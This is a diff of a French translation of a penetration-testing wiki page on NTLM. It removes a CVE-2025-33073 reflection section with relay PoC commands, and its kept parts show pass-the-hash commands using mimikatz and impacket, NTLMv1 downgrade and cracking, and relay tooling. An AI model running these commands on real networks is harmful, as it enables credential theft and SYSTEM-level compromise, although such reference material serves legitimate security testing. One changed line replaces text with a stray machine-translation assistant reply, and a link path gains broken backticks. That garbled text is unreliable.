@@ -2,70 +2,25 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## NTLM & Kerberos *Reflection* via Serialized SPNs (CVE-2025-33073)
 
-Windows contient plusieurs atténuations qui tentent de prévenir les attaques de *reflection* où une authentification NTLM (ou Kerberos) provenant d'un hôte est relayée vers le **même** hôte pour obtenir des privilèges SYSTEM.
-
-Microsoft a brisé la plupart des chaînes publiques avec MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) et des correctifs ultérieurs, cependant **CVE-2025-33073** montre que les protections peuvent encore être contournées en abusant de la façon dont le **client SMB tronque les noms de principal de service (SPNs)** qui contiennent des informations cibles *marshalled* (sérialisées).
-
-### TL;DR du bug
-1. Un attaquant enregistre un **enregistrement A DNS** dont l'étiquette encode un SPN marshalled – par exemple
-`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
-2. La victime est contrainte de s'authentifier à ce nom d'hôte (PetitPotam, DFSCoerce, etc.).
-3. Lorsque le client SMB passe la chaîne cible `cifs/srv11UWhRCAAAAA…` à `lsasrv!LsapCheckMarshalledTargetInfo`, l'appel à `CredUnmarshalTargetInfo` **strip** le blob sérialisé, laissant **`cifs/srv1`**.
-4. `msv1_0!SspIsTargetLocalhost` (ou l'équivalent Kerberos) considère maintenant la cible comme *localhost* parce que la partie hôte courte correspond au nom de l'ordinateur (`SRV1`).
-5. En conséquence, le serveur définit `NTLMSSP_NEGOTIATE_LOCAL_CALL` et injecte **le jeton d'accès SYSTEM de LSASS** dans le contexte (pour Kerberos, une clé de sous-session marquée SYSTEM est créée).
-6. Relayer cette authentification avec `ntlmrelayx.py` **ou** `krbrelayx.py` donne des droits SYSTEM complets sur le même hôte.
-
-### Quick PoC
-```bash
-# Add malicious DNS record
-dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
--a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
--d 10.10.10.50
-
-# Trigger authentication
-PetitPotam.py -u user -p pass -d DOMAIN \
-srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL
-
-# Relay listener (NTLM)
-ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
-
-# Relay listener (Kerberos) – remove NTLM mechType first
-krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
-```
-### Patch & Mitigations
-* Le correctif KB pour **CVE-2025-33073** ajoute une vérification dans `mrxsmb.sys::SmbCeCreateSrvCall` qui bloque toute connexion SMB dont la cible contient des informations marshallées (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
-* Appliquer **la signature SMB** pour prévenir la réflexion même sur les hôtes non corrigés.
-* Surveiller les enregistrements DNS ressemblant à `*<base64>...*` et bloquer les vecteurs de coercition (PetitPotam, DFSCoerce, AuthIP...).
-
-### Detection ideas
-* Captures réseau avec `NTLMSSP_NEGOTIATE_LOCAL_CALL` où l'IP du client ≠ l'IP du serveur.
-* Kerberos AP-REQ contenant une clé de sous-session et un principal client égal au nom d'hôte.
-* Connexions SYSTEM Windows Event 4624/4648 immédiatement suivies d'écritures SMB distantes depuis le même hôte.
-
-## References
-* [Synacktiv – NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
-* [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
-
-## Basic Information
+## Informations de base
 
 Dans les environnements où **Windows XP et Server 2003** sont en fonctionnement, les hachages LM (Lan Manager) sont utilisés, bien qu'il soit largement reconnu qu'ils peuvent être facilement compromis. Un hachage LM particulier, `AAD3B435B51404EEAAD3B435B51404EE`, indique un scénario où LM n'est pas utilisé, représentant le hachage pour une chaîne vide.
 
-Par défaut, le protocole d'authentification **Kerberos** est la méthode principale utilisée. NTLM (NT LAN Manager) intervient dans des circonstances spécifiques : absence d'Active Directory, inexistence du domaine, dysfonctionnement de Kerberos en raison d'une configuration incorrecte, ou lorsque des connexions sont tentées en utilisant une adresse IP plutôt qu'un nom d'hôte valide.
+Par défaut, le protocole d'authentification **Kerberos** est la méthode principale utilisée. NTLM (NT LAN Manager) intervient dans des circonstances spécifiques : absence d'Active Directory, non-existence du domaine, dysfonctionnement de Kerberos en raison d'une configuration incorrecte, ou lorsque des connexions sont tentées en utilisant une adresse IP plutôt qu'un nom d'hôte valide.
 
 La présence de l'en-tête **"NTLMSSP"** dans les paquets réseau signale un processus d'authentification NTLM.
 
 Le support des protocoles d'authentification - LM, NTLMv1 et NTLMv2 - est facilité par une DLL spécifique située à `%windir%\Windows\System32\msv1\_0.dll`.
 
-**Key Points**:
+**Points clés** :
 
 - Les hachages LM sont vulnérables et un hachage LM vide (`AAD3B435B51404EEAAD3B435B51404EE`) signifie son non-usage.
 - Kerberos est la méthode d'authentification par défaut, avec NTLM utilisé uniquement dans certaines conditions.
 - Les paquets d'authentification NTLM sont identifiables par l'en-tête "NTLMSSP".
 - Les protocoles LM, NTLMv1 et NTLMv2 sont supportés par le fichier système `msv1\_0.dll`.
 
-## LM, NTLMv1 and NTLMv2
+## LM, NTLMv1 et NTLMv2
 
 Vous pouvez vérifier et configurer quel protocole sera utilisé :
 
@@ -75,7 +30,7 @@ Exécutez _secpol.msc_ -> Politiques locales -> Options de sécurité -> Sécuri
 
 ![](<../../images/image (919).png>)
 
-### Registry
+### Registre
 
 Cela définira le niveau 5 :
 ```
@@ -109,7 +64,7 @@ L'authentification est comme celle mentionnée **avant mais** le **serveur** con
 
 La **longueur du défi est de 8 octets** et la **réponse fait 24 octets** de long.
 
-Le **hachage NT (16 octets)** est divisé en **3 parties de 7 octets chacune** (7B + 7B + (2B+0x00\*5)): la **dernière partie est remplie de zéros**. Ensuite, le **défi** est **chiffré séparément** avec chaque partie et les **octets chiffrés résultants sont joints**. Total : 8B + 8B + 8B = 24 octets.
+Le **hachage NT (16 octets)** est divisé en **3 parties de 7 octets chacune** (7B + 7B + (2B+0x00\*5)): la **dernière partie est remplie de zéros**. Ensuite, le **défi** est **chiffré séparément** avec chaque partie et les **octets chiffrés résultants sont joints**. Total : 8B + 8B + 8B = 24 Octets.
 
 **Problèmes** :
 
@@ -123,7 +78,7 @@ Le **hachage NT (16 octets)** est divisé en **3 parties de 7 octets chacune** (
 
 De nos jours, il devient moins courant de trouver des environnements avec une délégation non contrainte configurée, mais cela ne signifie pas que vous ne pouvez pas **abuser d'un service de spooler d'impression** configuré.
 
-Vous pourriez abuser de certains identifiants/sessions que vous avez déjà sur l'AD pour **demander à l'imprimante de s'authentifier** contre un **hôte sous votre contrôle**. Ensuite, en utilisant `metasploit auxiliary/server/capture/smb` ou `responder`, vous pouvez **définir le défi d'authentification à 1122334455667788**, capturer la tentative d'authentification, et si elle a été effectuée en utilisant **NTLMv1**, vous pourrez **le casser**.\
+Vous pourriez abuser de certains identifiants/sessions que vous avez déjà sur l'AD pour **demander à l'imprimante de s'authentifier** contre un **hôte sous votre contrôle**. Ensuite, en utilisant `metasploit auxiliary/server/capture/smb` ou `responder`, vous pouvez **définir le défi d'authentification à 1122334455667788**, capturer la tentative d'authentification, et si cela a été fait en utilisant **NTLMv1**, vous pourrez **le casser**.\
 Si vous utilisez `responder`, vous pourriez essayer d'**utiliser le drapeau `--lm`** pour essayer de **rétrograder** l'**authentification**.\
 _Remarque : pour cette technique, l'authentification doit être effectuée en utilisant NTLMv1 (NTLMv2 n'est pas valide)._
 
@@ -189,7 +144,7 @@ b4b9b02e6f09a9 # this is part 1
 ./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
 bd760f388b6700 # this is part 2
 ```
-Il semble que vous n'ayez pas fourni de texte à traduire. Veuillez fournir le contenu que vous souhaitez que je traduise en français.
+It seems that you haven't provided the text you want translated. Please share the relevant English text, and I'll be happy to translate it to French for you.
 ```bash
 ./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788
 
@@ -214,7 +169,7 @@ Si vous avez un **pcap qui a capturé un processus d'authentification réussi**,
 **Une fois que vous avez le hash de la victime**, vous pouvez l'utiliser pour **l'usurper**.\
 Vous devez utiliser un **outil** qui va **effectuer** l'**authentification NTLM en utilisant** ce **hash**, **ou** vous pourriez créer une nouvelle **sessionlogon** et **injecter** ce **hash** à l'intérieur de **LSASS**, de sorte que lorsque toute **authentification NTLM est effectuée**, ce **hash sera utilisé.** La dernière option est ce que fait mimikatz.
 
-**Veuillez, vous rappeler que vous pouvez également effectuer des attaques Pass-the-Hash en utilisant des comptes d'ordinateur.**
+**Veuillez, rappelez-vous que vous pouvez également effectuer des attaques Pass-the-Hash en utilisant des comptes d'ordinateur.**
 
 ### **Mimikatz**
 
@@ -222,9 +177,9 @@ Vous devez utiliser un **outil** qui va **effectuer** l'**authentification NTLM 
 ```bash
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
 ```
-Cela lancera un processus qui appartiendra aux utilisateurs ayant lancé mimikatz, mais en interne dans LSASS, les identifiants enregistrés sont ceux à l'intérieur des paramètres de mimikatz. Ensuite, vous pouvez accéder aux ressources réseau comme si vous étiez cet utilisateur (similaire à l'astuce `runas /netonly`, mais vous n'avez pas besoin de connaître le mot de passe en clair).
+Cela lancera un processus qui appartiendra aux utilisateurs ayant lancé mimikatz, mais en interne dans LSASS, les identifiants sauvegardés sont ceux à l'intérieur des paramètres de mimikatz. Ensuite, vous pouvez accéder aux ressources réseau comme si vous étiez cet utilisateur (similaire à la méthode `runas /netonly`, mais vous n'avez pas besoin de connaître le mot de passe en clair).
 
-### Pass-the-Hash depuis linux
+### Pass-the-Hash depuis Linux
 
 Vous pouvez obtenir une exécution de code sur des machines Windows en utilisant Pass-the-Hash depuis Linux.\
 [**Accédez ici pour apprendre comment le faire.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)
@@ -236,7 +191,7 @@ Vous pouvez télécharger [les binaires impacket pour Windows ici](https://githu
 - **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
 - **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
 - **atexec.exe** (Dans ce cas, vous devez spécifier une commande, cmd.exe et powershell.exe ne sont pas valides pour obtenir un shell interactif) `C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
-- Il existe plusieurs autres binaires Impacket...
+- Il y a plusieurs autres binaires Impacket...
 
 ### Invoke-TheHash
 
@@ -292,7 +247,7 @@ Après avoir capturé ces réponses NetNTLMv1, l'attaquant peut rapidement récu
 
 Si NetNTLMv1 n'est pas accepté—en raison de politiques de sécurité appliquées, alors l'attaquant peut échouer à récupérer une réponse NetNTLMv1.
 
-Pour gérer ce cas, l'outil Monologue Interne a été mis à jour : il acquiert dynamiquement un jeton de serveur en utilisant `AcceptSecurityContext()` pour toujours **capturer les réponses NetNTLMv2** si NetNTLMv1 échoue. Bien que NetNTLMv2 soit beaucoup plus difficile à casser, il ouvre toujours une voie pour des attaques de relais ou des attaques par force brute hors ligne dans des cas limités.
+Pour gérer ce cas, l'outil Monologue Interne a été mis à jour : il acquiert dynamiquement un jeton de serveur en utilisant `AcceptSecurityContext()` pour toujours **capturer les réponses NetNTLMv2** si NetNTLMv1 échoue. Bien que NetNTLMv2 soit beaucoup plus difficile à craquer, il ouvre toujours une voie pour des attaques de relais ou des attaques par force brute hors ligne dans des cas limités.
 
 Le PoC peut être trouvé dans **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.
 
@@ -301,7 +256,7 @@ Le PoC peut être trouvé dans **[https://github.com/eladshamir/Internal-Monolog
 **Lisez un guide plus détaillé sur la façon de réaliser ces attaques ici :**
 
 {{#ref}}
-../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
+../../generic-methodologies-and-resources/pentesting-network/`spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md`
 {{#endref}}
 
 ## Analyser les défis NTLM à partir d'une capture réseau
